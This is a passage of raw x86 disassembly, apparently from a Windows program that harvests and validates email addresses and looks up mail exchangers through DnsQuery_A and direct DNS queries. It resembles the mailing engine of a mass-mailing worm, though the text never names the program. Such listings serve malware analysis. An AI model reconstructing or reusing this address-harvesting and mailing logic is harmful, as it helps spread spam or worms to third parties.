		cmp	[esp+138h+var_124], 2
		jl	loc_803746
		jmp	short loc_803930
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803923:				; CODE XREF: sub_8036E5+117j
					; sub_8036E5+12Bj
		mov	eax, [esp+138h+arg_8]
		mov	dword ptr [eax], 2

loc_803930:				; CODE XREF: sub_8036E5+22Bj
					; sub_8036E5+23Cj
		push	ebx		; lpMem
		push	0		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapFree
		push	[esp+138h+s]	; s
		call	ds:closesocket
		mov	eax, [esp+138h+var_120]
		jmp	short loc_80395D
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803950:				; CODE XREF: sub_8036E5+4Cj
					; sub_8036E5+55j
		push	ebx		; lpMem
		push	ebp		; dwFlags
		call	esi
		push	eax		; hHeap
		call	ds:HeapFree
		xor	eax, eax

loc_80395D:				; CODE XREF: sub_8036E5+269j
		pop	edi

loc_80395E:				; CODE XREF: sub_8036E5+32j
		pop	esi
		pop	ebp
		pop	ebx
		add	esp, 128h
		retn
sub_8036E5	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_803968	proc near		; CODE XREF: sub_803B61-2Ep

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		xor	esi, esi

loc_80396F:				; CODE XREF: sub_803968+2Fj
		lea	eax, [ebp+var_4]
		push	eax
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_8036E5
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_80399B
		cmp	[ebp+var_4], 2
		jz	short loc_803999
		push	64h		; dwMilliseconds
		call	ds:Sleep
		inc	esi
		cmp	esi, 2
		jl	short loc_80396F

loc_803999:				; CODE XREF: sub_803968+21j
		xor	eax, eax

loc_80399B:				; CODE XREF: sub_803968+1Bj
		pop	esi
		leave
		retn
sub_803968	endp


;  S U B	R O U T	I N E 


sub_80399E	proc near		; CODE XREF: sub_803B61+4p

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  4

		push	ecx
		push	ecx
		push	ebp
		push	esi
		mov	esi, offset ModuleName ; "dnsapi.dll"
		push	esi		; lpModuleName
		call	ds:GetModuleHandleA
		xor	ebp, ebp
		cmp	eax, ebp
		jnz	short loc_8039BF
		push	esi		; lpLibFileName
		call	ds:LoadLibraryA
		cmp	eax, ebp
		jz	short loc_8039E3

loc_8039BF:				; CODE XREF: sub_80399E+14j
		push	offset aDnsquery_a ; lpProcName
		push	eax		; hModule
		call	ds:GetProcAddress
		cmp	eax, ebp
		jz	short loc_8039E3
		lea	ecx, [esp+10h+var_4]
		push	ebp
		push	ecx
		push	ebp
		push	ebp
		push	0Fh
		push	[esp+24h+arg_0]
		call	eax
		test	eax, eax
		jz	short loc_8039E7

loc_8039E3:				; CODE XREF: sub_80399E+1Fj
					; sub_80399E+2Fj
		xor	eax, eax
		jmp	short loc_803A57
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8039E7:				; CODE XREF: sub_80399E+43j
		push	edi
		mov	edi, [esp+10h]
		cmp	edi, ebp
		mov	[esp+0Ch], ebp
		jz	short loc_803A52
		push	ebx
		mov	ebx, 108h

loc_8039FA:				; CODE XREF: sub_80399E+B1j
		cmp	word ptr [edi+8], 0Fh
		jnz	short loc_803A4B
		push	ebx		; dwBytes
		push	0		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapAlloc
		mov	esi, eax
		test	esi, esi
		jz	short loc_803A51
		push	ebx
		push	0
		push	esi
		call	memset
		movzx	eax, word ptr [edi+1Ch]
		add	esp, 0Ch
		mov	[esi+4], eax
		lea	eax, [esi+8]
		push	0FFh		; iMaxLength
		push	dword ptr [edi+18h] ; lpString2
		push	eax		; lpString1
		call	ds:lstrcpynA
		test	ebp, ebp
		jnz	short loc_803A46
		mov	[esp+10h], esi
		jmp	short loc_803A49
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803A46:				; CODE XREF: sub_80399E+A0j
		mov	[ebp+0], esi

loc_803A49:				; CODE XREF: sub_80399E+A6j
		mov	ebp, esi

loc_803A4B:				; CODE XREF: sub_80399E+61j
		mov	edi, [edi]
		test	edi, edi
		jnz	short loc_8039FA

loc_803A51:				; CODE XREF: sub_80399E+77j
		pop	ebx

loc_803A52:				; CODE XREF: sub_80399E+54j
		mov	eax, [esp+0Ch]
		pop	edi

loc_803A57:				; CODE XREF: sub_80399E+47j
		pop	esi
		pop	ebp
		pop	ecx
		pop	ecx
		retn
sub_80399E	endp ; sp = -4

; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
; START	OF FUNCTION CHUNK FOR sub_803B61

loc_803A5C:				; CODE XREF: sub_803B61+Ej
		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		push	ebx
		push	esi
		mov	esi, offset aIphlpapi_dll ; "iphlpapi.dll"
		push	edi
		push	esi		; lpModuleName
		call	ds:GetModuleHandleA
		test	eax, eax
		jz	short loc_803A7A
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_803A81

loc_803A7A:				; CODE XREF: sub_803B61-EEj
		push	esi		; lpLibFileName
		call	ds:LoadLibraryA

loc_803A81:				; CODE XREF: sub_803B61-E9j
		test	eax, eax
		jz	loc_803B5A
		cmp	eax, 0FFFFFFFFh
		jz	loc_803B5A
		push	offset aGetnetworkpara ; lpProcName
		push	eax		; hModule
		call	ds:GetProcAddress
		mov	edi, eax
		test	edi, edi
		jz	loc_803B5A
		mov	ebx, ds:GetProcessHeap
		mov	esi, 4000h
		push	esi		; dwBytes
		push	0		; dwFlags
		call	ebx ; GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapAlloc
		lea	ecx, [ebp-0Ch]
		mov	[ebp-4], eax
		push	ecx
		push	eax
		mov	[ebp-0Ch], esi
		call	edi
		test	eax, eax
		jnz	loc_803B5A
		mov	edi, [ebp-4]
		and	[ebp-8], eax
		add	edi, 10Ch
		jmp	short loc_803B43
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803AE2:				; CODE XREF: sub_803B61-1Cj
		lea	esi, [edi+4]
		test	esi, esi
		jz	short loc_803B41
		push	35h		; hostshort
		mov	word ptr [ebp-1Ch], 2
		call	ds:htons
		push	esi		; cp
		mov	[ebp-1Ah], ax
		call	ds:inet_addr
		test	eax, eax
		mov	[ebp-18h], eax
		jz	short loc_803B0E
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_803B23

loc_803B0E:				; CODE XREF: sub_803B61-5Aj
		push	esi		; name
		call	ds:gethostbyname
		test	eax, eax
		jz	short loc_803B41
		mov	eax, [eax+0Ch]
		mov	eax, [eax]
		mov	eax, [eax]
		mov	[ebp-18h], eax

loc_803B23:				; CODE XREF: sub_803B61-55j
		test	eax, eax
		jz	short loc_803B41
		cmp	eax, 0FFFFFFFFh
		jz	short loc_803B41
		push	dword ptr [ebp+8]
		lea	eax, [ebp-1Ch]
		push	eax
		call	sub_803968
		pop	ecx
		mov	[ebp-8], eax
		test	eax, eax
		pop	ecx
		jnz	short loc_803B47

loc_803B41:				; CODE XREF: sub_803B61-7Aj
					; sub_803B61-4Aj ...
		mov	edi, [edi]

loc_803B43:				; CODE XREF: sub_803B61-81j
		test	edi, edi
		jnz	short loc_803AE2

loc_803B47:				; CODE XREF: sub_803B61-22j
		push	dword ptr [ebp-4] ; lpMem
		push	0		; dwFlags
		call	ebx ; GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapFree
		mov	eax, [ebp-8]
		jmp	short loc_803B5C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803B5A:				; CODE XREF: sub_803B61-DEj
					; sub_803B61-D5j ...
		xor	eax, eax

loc_803B5C:				; CODE XREF: sub_803B61-9j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; END OF FUNCTION CHUNK	FOR sub_803B61

;  S U B	R O U T	I N E 


sub_803B61	proc near		; CODE XREF: sub_80441A+16p

arg_4		= dword	ptr  8

; FUNCTION CHUNK AT 00803A5C SIZE 00000105 BYTES

		push	[esp-4+arg_4]
		call	sub_80399E
		test	eax, eax
		pop	ecx
		jnz	short locret_803B74
		jmp	loc_803A5C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

locret_803B74:				; CODE XREF: sub_803B61+Cj
		retn
sub_803B61	endp ; sp =  4


;  S U B	R O U T	I N E 


sub_803B75	proc near		; CODE XREF: sub_804349+AFp
					; sub_80441A+45p

lpMem		= dword	ptr  4

		mov	eax, [esp+lpMem]
		test	eax, eax
		jz	short locret_803B97
		push	esi

loc_803B7E:				; CODE XREF: sub_803B75+1Fj
		mov	esi, [eax]
		push	eax		; lpMem
		push	0		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapFree
		test	esi, esi
		mov	eax, esi
		jnz	short loc_803B7E
		pop	esi

locret_803B97:				; CODE XREF: sub_803B75+6j
		retn
sub_803B75	endp


;  S U B	R O U T	I N E 


sub_803B98	proc near		; CODE XREF: sub_80411A+8p

var_4		= dword	ptr -4
arg_0		= dword	ptr  4

		push	ecx
		push	ebp
		mov	ebp, [esp+8+arg_0]
		push	edi
		mov	edi, eax
		push	edi
		call	strlen
		cmp	eax, 3
		pop	ecx
		jnb	short loc_803BB5
		xor	eax, eax
		inc	eax
		jmp	loc_803DAB
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803BB5:				; CODE XREF: sub_803B98+13j
		push	ebx
		push	esi
		xor	esi, esi
		cmp	byte ptr [edi],	0
		jz	short loc_803C11

loc_803BBE:				; CODE XREF: sub_803B98+5Fj
		movsx	eax, byte ptr [esi+edi]
		push	eax		; int
		call	ds:isspace
		test	eax, eax
		pop	ecx
		jnz	short loc_803BF2
		movsx	eax, byte ptr [esi+edi]
		push	eax		; int
		call	ds:isalnum
		test	eax, eax
		pop	ecx
		jnz	short loc_803C11
		mov	al, [esi+edi]
		push	eax
		push	offset a__@	; "_-!.@"
		call	sub_802F04
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_803C11

loc_803BF2:				; CODE XREF: sub_803B98+34j
		inc	esi
		cmp	byte ptr [esi+edi], 0
		jnz	short loc_803BBE
		jmp	short loc_803C11
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803BFB:				; CODE XREF: sub_803B98+7Ej
		movsx	eax, al
		push	eax		; int
		push	offset a__	; char *
		call	ds:strchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_803C18
		inc	esi

loc_803C11:				; CODE XREF: sub_803B98+24j
					; sub_803B98+44j ...
		mov	al, [esi+edi]
		test	al, al
		jnz	short loc_803BFB

loc_803C18:				; CODE XREF: sub_803B98+76j
		xor	ebx, ebx
		mov	[esp+14h+var_4], ebx
		jmp	short loc_803C5C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803C20:				; CODE XREF: sub_803B98+C9j
		cmp	al, 40h
		jz	short loc_803C63
		movsx	eax, al
		push	eax		; int
		call	ds:isalnum
		test	eax, eax
		pop	ecx
		jnz	short loc_803C47
		mov	al, [esi+edi]
		push	eax
		push	offset a__@	; "_-!.@"
		call	sub_802F04
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_803C5B

loc_803C47:				; CODE XREF: sub_803B98+99j
		movsx	eax, byte ptr [esi+edi]
		push	eax		; int
		call	ds:tolower
		mov	[ebx+ebp], al
		inc	ebx
		pop	ecx
		mov	[esp+14h+var_4], ebx

loc_803C5B:				; CODE XREF: sub_803B98+ADj
		inc	esi

loc_803C5C:				; CODE XREF: sub_803B98+86j
		mov	al, [esi+edi]
		test	al, al
		jnz	short loc_803C20

loc_803C63:				; CODE XREF: sub_803B98+8Aj
		cmp	byte ptr [esi+edi], 40h
		jnz	loc_803DA6

loc_803C6D:				; CODE XREF: sub_803B98+DAj
		inc	esi
		cmp	byte ptr [esi+edi], 40h
		jz	short loc_803C6D
		and	byte ptr [ebx+ebp], 0
		push	ebp
		call	strlen
		pop	ecx
		mov	ebx, eax
		jmp	short loc_803CD3
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803C83:				; CODE XREF: sub_803B98+13Cj
		movsx	eax, byte ptr [ebx+ebp]
		push	eax		; int
		call	ds:isspace
		test	eax, eax
		pop	ecx
		jnz	short loc_803CD3
		movsx	eax, byte ptr [ebx+ebp]
		push	eax		; int
		push	offset a__	; char *
		call	ds:strchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_803CD3
		movsx	eax, byte ptr [ebx+ebp]
		push	eax		; int
		call	ds:isalnum
		test	eax, eax
		pop	ecx
		jnz	short loc_803CCD
		mov	al, [ebx+ebp]
		push	eax
		push	offset a__@	; "_-!.@"
		call	sub_802F04
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_803CD3

loc_803CCD:				; CODE XREF: sub_803B98+11Fj
		cmp	byte ptr [ebx+ebp], 40h
		jnz	short loc_803CD6

loc_803CD3:				; CODE XREF: sub_803B98+E9j
					; sub_803B98+F9j ...
		dec	ebx
		jns	short loc_803C83

loc_803CD6:				; CODE XREF: sub_803B98+139j
		and	byte ptr [ebx+ebp+1], 0
		mov	ebx, [esp+14h+var_4]
		mov	byte ptr [ebx+ebp], 40h
		inc	ebx
		add	esi, edi
		jmp	short loc_803D26
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803CE8:				; CODE XREF: sub_803B98+191j
		movsx	eax, byte ptr [esi]
		push	eax		; int
		call	ds:isalnum
		test	eax, eax
		pop	ecx
		jnz	short loc_803D0A
		mov	al, [esi]
		push	eax
		push	offset a__@	; "_-!.@"
		call	sub_802F04
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_803D25

loc_803D0A:				; CODE XREF: sub_803B98+15Dj
		cmp	byte ptr [ebx+ebp-1], 2Eh
		jnz	short loc_803D16
		cmp	byte ptr [esi],	2Eh
		jz	short loc_803D25

loc_803D16:				; CODE XREF: sub_803B98+177j
		movsx	eax, byte ptr [esi]
		push	eax		; int
		call	ds:tolower
		mov	[ebx+ebp], al
		pop	ecx
		inc	ebx

loc_803D25:				; CODE XREF: sub_803B98+170j
					; sub_803B98+17Cj
		inc	esi

loc_803D26:				; CODE XREF: sub_803B98+14Ej
		cmp	byte ptr [esi],	0
		jnz	short loc_803CE8
		and	byte ptr [ebx+ebp], 0
		push	ebp
		call	strlen
		pop	ecx
		mov	edi, eax
		jmp	short loc_803D88
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803D3A:				; CODE XREF: sub_803B98+1F1j
		lea	esi, [edi+ebp]
		movsx	eax, byte ptr [esi]
		push	eax		; int
		call	ds:isspace
		test	eax, eax
		pop	ecx
		jnz	short loc_803D88
		movsx	eax, byte ptr [esi]
		push	eax		; int
		push	offset a__	; char *
		call	ds:strchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_803D88
		movsx	eax, byte ptr [esi]
		push	eax		; int
		call	ds:isalnum
		test	eax, eax
		pop	ecx
		jnz	short loc_803D83
		mov	al, [esi]
		push	eax
		push	offset a__@	; "_-!.@"
		call	sub_802F04
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_803D88

loc_803D83:				; CODE XREF: sub_803B98+1D6j
		cmp	byte ptr [esi],	40h
		jnz	short loc_803D8B

loc_803D88:				; CODE XREF: sub_803B98+1A0j
					; sub_803B98+1B2j ...
		dec	edi
		jns	short loc_803D3A

loc_803D8B:				; CODE XREF: sub_803B98+1EEj
		and	byte ptr [edi+ebp+1], 0
		push	ebp		; lpString
		call	ds:lstrlenA
		cmp	eax, 3
		jl	short loc_803DA6
		cmp	byte ptr [ebp+0], 40h
		jz	short loc_803DA6
		xor	eax, eax
		jmp	short loc_803DA9
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803DA6:				; CODE XREF: sub_803B98+CFj
					; sub_803B98+202j ...
		xor	eax, eax
		inc	eax

loc_803DA9:				; CODE XREF: sub_803B98+20Cj
		pop	esi
		pop	ebx

loc_803DAB:				; CODE XREF: sub_803B98+18j
		pop	edi
		pop	ebp
		pop	ecx
		retn
sub_803B98	endp


;  S U B	R O U T	I N E 


sub_803DAF	proc near		; CODE XREF: sub_803E39+A3p

lpString1	= dword	ptr  0Ch

		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		xor	edi, edi
		mov	ebx, eax
		cmp	byte ptr [esi],	40h
		jz	short loc_803DE4

loc_803DBD:				; CODE XREF: sub_803DAF+33j
		mov	al, [edi+esi]
		test	al, al
		jz	short loc_803DE4
		test	ebx, ebx
		jz	short loc_803DDD
		movsx	eax, al
		push	eax		; int
		call	ds:isspace
		test	eax, eax
		pop	ecx
		jnz	short loc_803DDD
		mov	al, [edi+esi]
		mov	[ebx], al
		inc	ebx

loc_803DDD:				; CODE XREF: sub_803DAF+17j
					; sub_803DAF+26j
		inc	edi
		cmp	byte ptr [edi+esi], 40h
		jnz	short loc_803DBD

loc_803DE4:				; CODE XREF: sub_803DAF+Cj
					; sub_803DAF+13j
		test	ebx, ebx
		jz	short loc_803DEB
		and	byte ptr [ebx],	0

loc_803DEB:				; CODE XREF: sub_803DAF+37j
		cmp	byte ptr [edi+esi], 0
		jz	short loc_803E23
		mov	ebx, [esp+4+lpString1]
		test	ebx, ebx
		jz	short loc_803E35
		lea	eax, [edi+esi+1]
		cmp	byte ptr [eax],	0
		jz	short loc_803E1E
		mov	esi, eax

loc_803E04:				; CODE XREF: sub_803DAF+6Dj
		movsx	eax, byte ptr [esi]
		push	eax		; int
		call	ds:isspace
		test	eax, eax
		pop	ecx
		jnz	short loc_803E18
		mov	al, [esi]
		mov	[ebx], al
		inc	ebx

loc_803E18:				; CODE XREF: sub_803DAF+62j
		inc	esi
		cmp	byte ptr [esi],	0
		jnz	short loc_803E04

loc_803E1E:				; CODE XREF: sub_803DAF+51j
		and	byte ptr [ebx],	0
		jmp	short loc_803E35
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803E23:				; CODE XREF: sub_803DAF+40j
		cmp	[esp+4+lpString1], 0
		jz	short loc_803E35
		push	esi		; lpString2
		push	[esp+8+lpString1] ; lpString1
		call	ds:lstrcpyA

loc_803E35:				; CODE XREF: sub_803DAF+48j
					; sub_803DAF+72j ...
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_803DAF	endp


;  S U B	R O U T	I N E 


sub_803E39	proc near		; CODE XREF: sub_80411A:loc_804131p
		mov	cl, [esi]
		xor	eax, eax
		push	ebx
		push	edi
		test	cl, cl
		jnz	short loc_803E49
		inc	eax
		jmp	loc_803FC5
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803E49:				; CODE XREF: sub_803E39+8j
		and	ds:dword_807F28, 0

loc_803E50:				; CODE XREF: sub_803E39+28j
		cmp	cl, 40h
		jnz	short loc_803E5B
		inc	ds:dword_807F28

loc_803E5B:				; CODE XREF: sub_803E39+1Aj
		inc	eax
		mov	cl, [eax+esi]
		test	cl, cl
		jnz	short loc_803E50
		push	ebp
		xor	ebp, ebp
		inc	ebp
		mov	ds:dword_807F2C, eax
		cmp	ds:dword_807F28, ebp
		jnz	loc_803FC2
		push	esi
		call	strlen
		pop	ecx
		jmp	short loc_803E94
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803E81:				; CODE XREF: sub_803E39+62j
		mov	cl, [esi+eax-1]
		cmp	cl, 2Eh
		jz	short loc_803E9D
		cmp	cl, 40h
		jz	loc_803FC2
		dec	eax

loc_803E94:				; CODE XREF: sub_803E39+46j
		test	eax, eax
		mov	ds:dword_807F2C, eax
		jg	short loc_803E81

loc_803E9D:				; CODE XREF: sub_803E39+4Fj
		test	eax, eax
		jz	loc_803FC2
		push	esi
		call	strlen
		pop	ecx
		mov	ecx, ebp
		sub	ecx, ds:dword_807F2C
		add	eax, ecx
		cmp	eax, 2
		mov	ds:dword_808030, eax
		jl	loc_803FC2
		cmp	eax, 4
		jg	loc_803FC2
		mov	edi, offset byte_808038
		mov	ebx, offset byte_807F30
		push	edi
		mov	eax, ebx
		mov	ecx, esi
		call	sub_803DAF
		push	ebx
		call	strlen
		pop	ecx
		cmp	eax, 2
		pop	ecx
		mov	ds:dword_807F2C, eax
		jl	loc_803FC2
		cmp	eax, 18h
		jg	loc_803FC2
		push	edi
		call	strlen
		cmp	eax, 6
		pop	ecx
		mov	ds:dword_807F2C, eax
		jl	loc_803FC2
		cmp	eax, 2Ah
		jg	loc_803FC2
		push	edi
		call	strlen
		pop	ecx
		jmp	short loc_803F3D
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803F27:				; CODE XREF: sub_803E39+10Cj
		cmp	ds:byte_808038[eax], 2Eh
		jnz	short loc_803F3D
		cmp	ds:byte_808037[eax], 2Eh
		jz	loc_803FC2

loc_803F3D:				; CODE XREF: sub_803E39+ECj
					; sub_803E39+F5j
		dec	eax
		test	eax, eax
		mov	ds:dword_807F2C, eax
		jg	short loc_803F27
		mov	cl, ds:byte_807F30
		xor	eax, eax
		and	ds:dword_807F28, eax
		mov	ds:dword_807F2C, eax
		test	cl, cl
		jz	short loc_803F7E

loc_803F5E:				; CODE XREF: sub_803E39+13Ej
		cmp	cl, 30h
		jl	short loc_803F6E
		cmp	cl, 39h
		jg	short loc_803F6E
		inc	ds:dword_807F28

loc_803F6E:				; CODE XREF: sub_803E39+128j
					; sub_803E39+12Dj
		mov	cl, ds:byte_807F31[eax]
		inc	eax
		test	cl, cl
		jnz	short loc_803F5E
		mov	ds:dword_807F2C, eax

loc_803F7E:				; CODE XREF: sub_803E39+123j
		push	ebx
		call	strlen
		mov	ecx, eax
		mov	eax, ds:dword_807F28
		imul	eax, 64h
		xor	edx, edx
		push	ebx
		div	ecx
		mov	ds:dword_807F2C, eax
		call	strlen
		pop	ecx
		cmp	eax, 0Ch
		pop	ecx
		jbe	short loc_803FAD
		cmp	ds:dword_807F2C, 32h
		jmp	short loc_803FC0
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803FAD:				; CODE XREF: sub_803E39+169j
		push	ebx
		call	strlen
		cmp	eax, 6
		pop	ecx
		jb	short loc_803FC8
		cmp	ds:dword_807F2C, 3Ch

loc_803FC0:				; CODE XREF: sub_803E39+172j
		jl	short loc_803FD1

loc_803FC2:				; CODE XREF: sub_803E39+39j
					; sub_803E39+54j ...
		mov	eax, ebp

loc_803FC4:				; CODE XREF: sub_803E39+19Aj
		pop	ebp

loc_803FC5:				; CODE XREF: sub_803E39+Bj
		pop	edi
		pop	ebx
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803FC8:				; CODE XREF: sub_803E39+17Ej
		cmp	ds:dword_807F2C, 46h
		jge	short loc_803FC2

loc_803FD1:				; CODE XREF: sub_803E39:loc_803FC0j
		xor	eax, eax
		jmp	short loc_803FC4
sub_803E39	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_803FD5	proc near		; CODE XREF: sub_80411A+57p

var_100		= dword	ptr -100h

		push	ebp
		mov	ebp, esp
		sub	esp, 100h
		push	esi
		mov	esi, eax
		jmp	short loc_803FE8
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_803FE3:				; CODE XREF: sub_803FD5+17j
		cmp	al, 40h
		jz	short loc_803FF2
		inc	esi

loc_803FE8:				; CODE XREF: sub_803FD5+Cj
		mov	al, [esi]
		test	al, al
		jnz	short loc_803FE3
		cmp	al, 40h
		jnz	short loc_80404F

loc_803FF2:				; CODE XREF: sub_803FD5+10j
		push	edi
		xor	edi, edi
		inc	esi

loc_803FF6:				; CODE XREF: sub_803FD5+41j
		mov	al, [esi]
		test	al, al
		jz	short loc_804018
		movsx	eax, al
		push	eax		; int
		call	ds:tolower
		mov	byte ptr [ebp+edi+var_100], al
		inc	edi
		inc	esi
		cmp	edi, 0FFh
		pop	ecx
		jl	short loc_803FF6

loc_804018:				; CODE XREF: sub_803FD5+25j
		and	byte ptr [ebp+edi+var_100], 0
		cmp	ds:dword_801228, 0
		pop	edi
		jz	short loc_80404F
		mov	eax, offset dword_801228
		mov	esi, eax

loc_804031:				; CODE XREF: sub_803FD5+78j
